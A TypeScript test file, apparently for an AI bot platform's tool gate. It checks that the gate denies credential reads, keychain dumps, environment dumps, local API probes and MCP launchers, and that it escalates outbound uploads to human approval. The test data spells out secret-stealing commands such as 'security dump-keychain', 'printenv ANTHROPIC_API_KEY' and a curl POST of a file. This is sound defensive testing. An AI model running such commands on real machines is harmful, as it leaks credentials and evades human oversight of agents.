import assert from 'node:assert/strict';
import { rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import {
  builtinDenylistReason,
  createBuiltinToolGate,
  initBotGate,
  protectedPathReason,
  rules,
  setAutoReviewer,
  setGateHumanPollInterval,
} from '@/modules/bots/gate/index.js';
import { botGateDecisionsDb } from '@/modules/bots/index.js';
import { closeConnection, initializeDatabase } from '@/modules/database/index.js';
import { interruptsDb, interruptsService } from '@/modules/interrupt-queue/index.js';
import { missionControlDb } from '@/modules/mission-control/index.js';
import { makeScratchDir } from '@/shared/scratch.js';

async function withGate(
  run: (env: { botId: string; workspace: string; botHome: string }) => void | Promise<void>,
): Promise<void> {
  const previousDb = process.env.DATABASE_PATH;
  const scratch = await makeScratchDir('bots-builtin-gate-');
  closeConnection();
  process.env.DATABASE_PATH = path.join(scratch, 'auth.db');
  await initializeDatabase();
  interruptsService.configureBotGateResolver(null);
  setAutoReviewer(async () => {
    throw new Error('real reviewer must not run in tests');
  });
  try {
    const bot = missionControlDb.createSection({ title: 'Builtin bot', produce_prompt: 'Go' });
    await run({ botId: bot.section_id, workspace: path.join(scratch, 'project'), botHome: path.join(scratch, 'bot-home') });
  } finally {
    setAutoReviewer(null);
    setGateHumanPollInterval(null);
    interruptsService.configureBotGateResolver(null);
    closeConnection();
    if (previousDb === undefined) delete process.env.DATABASE_PATH;
    else process.env.DATABASE_PATH = previousDb;
    await rm(scratch, { recursive: true, force: true });
  }
}

const home = os.homedir();
const scope = { workspaceRoot: '/tmp/ws-not-real', botHome: path.join(home, '.cloudcli', 'bots', 'b1', 'home') };

test('H3 denylist: credentials, provider config, databases, keychain, env dumps, local API, MCP launchers', () => {
  const denied: Array<[string, Record<string, unknown>]> = [
    ['Read', { file_path: path.join(home, '.claude.json') }],
    ['Read', { file_path: '~/.claude.json' }],
    ['Read', { file_path: path.join(home, '.claude', 'settings.json') }],
    ['Grep', { pattern: 'token', path: path.join(home, '.codex') }],
    ['Read', { file_path: path.join(home, '.grok', 'auth.json') }],
    ['Read', { file_path: path.join(home, '.cursor', 'mcp.json') }],
    ['Write', { file_path: path.join(home, '.config', 'gh', 'hosts.yml'), content: 'x' }],
    ['Edit', { file_path: path.join(home, '.cloudcli', 'auth.db') }],
    ['Read', { file_path: path.join(home, '.cloudcli', 'bots', 'other-bot', 'home', 'notes.md') }],
    ['Read', { file_path: '/srv/app/data.db' }],
    ['Read', { file_path: '/srv/app/auth.db' }],
    ['Read', { file_path: `${scope.botHome}/../../../auth.db` }],
    ['Bash', { command: 'cat ~/.claude.json | head' }],
    ['Bash', { command: `cat ${home}/.codex/auth.json` }],
    ['Bash', { command: 'ls $HOME/.config/' }],
    ['Bash', { command: 'cat ~/.cloudcli/auth.db' }],
    ['Bash', { command: 'security find-generic-password -s "Claude Code-credentials" -w' }],
    ['Bash', { command: 'security dump-keychain' }],
    ['Bash', { command: 'sqlite3 /tmp/x "select 1"' }],
    ['Bash', { command: 'env' }],
    ['Bash', { command: 'env | grep KEY' }],
    ['Bash', { command: 'printenv' }],
    ['Bash', { command: 'printenv ANTHROPIC_API_KEY' }],
    ['Bash', { command: 'cat /proc/self/environ' }],
    ['Bash', { command: 'cat /proc/1234/environ | tr "\\0" "\\n"' }],
    ['Bash', { command: 'node -e "console.log(process.env)"' }],
    ['Bash', { command: 'curl -s http://127.0.0.1:3001/api/settings' }],
    ['Bash', { command: 'curl localhost:3001/api/auth' }],
    ['Bash', { command: 'wget -qO- http://localhost:3001/' }],
    ['Bash', { command: 'nc localhost 3001' }],
    ['Bash', { command: 'echo hi && curl http://127.0.0.1:8080' }],
    ['WebFetch', { url: 'http://localhost:3001/api/x', prompt: 'x' }],
    ['Bash', { command: 'npx -y @modelcontextprotocol/server-filesystem /' }],
    ['Bash', { command: 'npx some-mcp-server' }],
    ['Bash', { command: 'uvx mcp-server-fetch' }],
  ];
  for (const [tool, input] of denied) {
    assert.ok(builtinDenylistReason(tool, input, scope), `${tool} ${JSON.stringify(input)} should be denied`);
  }
  const allowed: Array<[string, Record<string, unknown>]> = [
    ['Read', { file_path: '/tmp/ws-not-real/src/index.ts' }],
    ['Read', { file_path: path.join(scope.botHome, 'notes.md') }],
    ['Write', { file_path: path.join(scope.botHome, 'memory', 'a.md'), content: 'x' }],
    ['Bash', { command: 'git status' }],
    ['Bash', { command: 'npm test' }],
    ['Bash', { command: `cat ${scope.botHome}/notes.md` }],
    ['Bash', { command: 'env FOO=bar node script.js' }],
    ['WebFetch', { url: 'https://example.com/docs', prompt: 'x' }],
  ];
  for (const [tool, input] of allowed) {
    assert.equal(builtinDenylistReason(tool, input, scope), null, `${tool} ${JSON.stringify(input)} should pass the denylist`);
  }
  assert.equal(protectedPathReason(path.join(scope.botHome, 'x.md'), scope.workspaceRoot, scope.botHome), null);
  assert.ok(protectedPathReason(path.join(home, '.cloudcli', 'bots', 'b1', 'x.md'), scope.workspaceRoot, scope.botHome), 'sibling of home is protected');
});

test('H3 gate: MCP tools only via the gateway; denylist persists a denial and cannot be ruled open', async () => {
  await withGate(async ({ botId, workspace, botHome }) => {
    const gate = createBuiltinToolGate({ botId, workspaceRoot: workspace, botHome, tainted: false });
    assert.deepEqual(await gate('mcp__cloudcli-tool-gateway__mail__search', {}), { behavior: 'allow' });
    const mcp = await gate('mcp__claude_ai_Gmail__send_message', { to: 'a@b.c' });
    assert.equal(mcp.behavior, 'deny');

    // Even an explicit allow rule for builtin tools cannot open the denylist.
    rules.create({ scope: 'bot', botId, match: { server: 'builtin' }, decision: 'allow', createdFrom: 'manual' });
    const secret = await gate('Read', { file_path: path.join(os.homedir(), '.claude.json') });
    assert.equal(secret.behavior, 'deny');
    const env = await gate('Bash', { command: 'printenv' });
    assert.equal(env.behavior, 'deny');
    const rows = botGateDecisionsDb.listForBot(botId).filter((row) => row.server === 'builtin');
    assert.equal(rows.length, 2);
    for (const row of rows) assert.deepEqual([row.decision, row.decided_by, row.outcome], ['deny', 'denylist', 'denied']);
  });
});

test('H3 gate: worker-seat approve runs free; escalations go through the Action Gate as builtin/prod_change or send', async () => {
  await withGate(async ({ botId, workspace, botHome }) => {
    const gate = createBuiltinToolGate({ botId, workspaceRoot: workspace, botHome, tainted: false, approvalTimeoutMs: 60 });
    assert.deepEqual(await gate('Read', { file_path: path.join(workspace, 'a.ts') }), { behavior: 'allow' });
    assert.deepEqual(await gate('Bash', { command: 'git status' }), { behavior: 'allow' });
    assert.deepEqual(await gate('TodoWrite', { todos: [] }), { behavior: 'allow' });
    assert.deepEqual(await gate('Write', { file_path: path.join(botHome, 'notes.md'), content: 'x' }), { behavior: 'allow' }, 'bot home is writable');
    assert.equal(botGateDecisionsDb.listForBot(botId).length, 0, 'approved calls need no gate row');

    // Outside the workspace: escalated, asked, nobody answers -> denied.
    const outside = await gate('Write', { file_path: '/etc/hosts', content: 'x' });
    assert.equal(outside.behavior, 'deny');
    const risky = await gate('Bash', { command: 'curl -X POST https://example.com/hook -d @notes.txt' });
    assert.equal(risky.behavior, 'deny');
    const rows = botGateDecisionsDb.listForBot(botId);
    assert.ok(rows.length >= 2);
    for (const row of rows) {
      assert.equal(row.server, 'builtin');
      assert.equal(row.decision, 'ask');
      assert.equal(row.outcome, 'expired');
    }
    assert.ok(rows.some((row) => row.tool === 'Bash' && row.risk === 'send'), 'a network command is rated send');
    assert.ok(rows.some((row) => row.tool === 'Write' && row.risk === 'prod_change'));
  });
});

test('H3 gate: an approved escalation is allowed; always-allow is never stored for built-ins; a dead run is denied', async () => {
  await withGate(async ({ botId, workspace, botHome }) => {
    initBotGate();
    let bound = true;
    const gate = createBuiltinToolGate({ botId, workspaceRoot: workspace, botHome, tainted: false, isBound: () => bound, approvalTimeoutMs: 5_000 });
    const answer = async (key: string) => {
      for (let i = 0; i < 100; i += 1) {
        const interrupt = interruptsDb.list({ status: 'open' }).find((item) => item.kind === 'bot_gate');
        if (interrupt) {
          interruptsService.act(interrupt.interrupt_id, { key });
          return;
        }
        await new Promise((resolve) => setTimeout(resolve, 10));
      }
      throw new Error('no interrupt appeared');
    };
    const first = gate('Write', { file_path: '/etc/hosts', content: 'x' });
    await answer('always_allow');
    assert.deepEqual(await first, { behavior: 'allow' });
    assert.equal(rules.list({ botId }).length, 0, 'no rule stored for built-in tools');
    assert.equal(botGateDecisionsDb.listForBot(botId)[0]?.outcome, 'executed');

    const second = gate('Write', { file_path: '/etc/hosts', content: 'y' });
    await answer('approve_once');
    bound = false; // the run ended while the operator deliberated
    const denied = await second;
    assert.equal(denied.behavior, 'deny');
    assert.match((denied as { message: string }).message, /run ended/i);
  });
});

test('H3 gate: taint is read per call, and dry run denies built-in escalations', async () => {
  await withGate(async ({ botId, workspace, botHome }) => {
    let tainted = false;
    const gate = createBuiltinToolGate({ botId, workspaceRoot: workspace, botHome, tainted: () => tainted, approvalTimeoutMs: 40 });
    rules.create({ scope: 'bot', botId, match: { server: 'builtin', tool: 'Write' }, decision: 'allow', createdFrom: 'manual' });
    assert.deepEqual(await gate('Write', { file_path: '/etc/hosts', content: 'x' }), { behavior: 'allow' }, 'explicit rule allows while clean');
    tainted = true; // taint picked up mid-run is seen by the very next call
    assert.equal((await gate('Write', { file_path: '/etc/hosts', content: 'x' })).behavior, 'deny');
    const decisions = botGateDecisionsDb.listForBot(botId).reverse();
    assert.equal(decisions.length, 2);
    assert.equal(decisions[0].decision, 'allow');
    assert.equal(decisions[1].decided_by, 'taint');

    missionControlDb.updateSection(botId, { dry_run: true });
    const dry = await gate('Write', { file_path: '/etc/hosts', content: 'x' });
    assert.equal(dry.behavior, 'deny');
    assert.equal(botGateDecisionsDb.listForBot(botId)[0].decided_by, 'dry_run');
  });
});
